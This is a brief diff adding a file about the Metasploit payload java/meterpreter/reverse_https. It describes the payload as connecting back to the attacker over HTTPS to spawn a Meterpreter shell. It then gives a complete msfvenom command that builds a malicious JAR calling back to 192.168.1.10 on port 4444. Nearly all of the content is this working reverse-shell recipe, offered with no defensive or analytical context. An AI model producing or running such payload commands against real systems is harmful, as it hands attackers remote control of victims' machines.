@@ -1,0 +1,4 @@
+# java/meterpreter/reverse_https
+# This payload connects back to the attacker using HTTPS and spawns a Meterpreter shell on a Java platform.
+
+msfvenom -p java/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=4444 -f jar > meterpreter.jar
